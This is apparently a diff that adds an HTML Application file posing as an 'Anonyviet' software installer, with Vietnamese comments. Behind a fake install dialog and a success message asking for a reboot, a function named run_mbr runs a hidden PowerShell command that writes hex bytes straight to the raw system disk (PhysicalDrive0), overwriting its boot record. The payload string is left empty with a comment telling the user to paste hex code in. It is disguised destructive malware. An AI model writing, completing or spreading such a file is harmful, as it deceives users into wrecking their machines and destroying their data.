@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Anonyviet Installer</title>
+    <HTA:APPLICATION 
+        ID="objAnonyviet"
+        APPLICATIONNAME="Anonyviet Setup"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+        SYSMENU="yes"
+        CAPTION="yes"
+    />
+
+    <script language="VBScript">
+        Sub Window_OnLoad
+            window.resizeTo 400, 200
+        End Sub
+
+        Sub run_mbr()
+            ' --- KHAI BÁO BIẾN DỮ LIỆU HEX (ĐỂ TRỐNG NHƯ PYTHON) ---
+            Dim ma_doc
+            ma_doc = "" ' paste đoạn code dữ liệu hex tại đây (ví dụ: "E81500BB...")
+
+            ' --- VÒNG LẶP HỘP THOẠI ĐIỀU HƯỚNG ---
+            ' MB_YESNO (4) + MB_ICONQUESTION (32) = 36
+            ' IDNO = 7
+            Do
+                traLoi = MsgBox("Bấm ""Yes để tiếp tục cài đặt"" ", 36, "Anonyviet")
+            Loop While traLoi = 7
+
+            ' Tạm dừng 3 giây (sleep 3)
+            Dim objShell
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run "ping 127.0.0.1 -n 4", 0, True
+
+            ' Thông báo hoàn tất
+            MsgBox "Đã cài đặt hoàn tất " & vbCrLf & "Vui lòng khởi động lại máy để phần mềm được làm mới !", 64, "Anonyviet"
+
+            ' --- LOGIC KHỞI TẠO VÀ GHI VÀO PHYSICALDRIVE0 (Tương đương Python) ---
+            ' Nếu biến ma_doc có dữ liệu, VBScript sẽ gọi PowerShell thực thi quyền ghi mức thấp
+            If ma_doc <> "" Then
+                Dim psCommand
+                ' Lệnh PowerShell cấu hình FileStream để mở ổ đĩa và ghi mảng byte
+                psCommand = "powershell -Command """ & _
+                    "$bytes = [System.Globalization.NumberStyles]::HexNumber; " & _
+                    "$hex = '" & ma_doc & "'; " & _
+                    "$data = New-Object Byte[] ($hex.Length / 2); " & _
+                    "for($i=0; $i -lt $hex.Length; $i+=2){ $data[$i/2] = [Convert]::ToByte($hex.Substring($i, 2), $bytes) }; " & _
+                    "$disk = [System.IO.File]::Open('\\.\PhysicalDrive0', 'Open', 'ReadWrite'); " & _
+                    "$disk.Write($data, 0, $data.Length); " & _
+                    "$disk.Close();"""
+                
+                ' Chạy lệnh ngầm (0: Ẩn cửa sổ CMD, True: Chờ lệnh thực thi xong)
+                objShell.Run psCommand, 0, True
+            End If
+
+            ' Đóng cửa sổ ứng dụng
+            window.close()
+        End Sub
+    </script>
+</head>
+<body style="font-family: Arial; text-align: center; background: #f0f0f0; padding-top: 30px;">
+    <h3>Trình cài đặt hệ thống Anonyviet</h3>
+    <button onclick="run_mbr()" style="padding: 10px 20px; cursor: pointer;">Cài đặt</button>
+</body>
+</html>
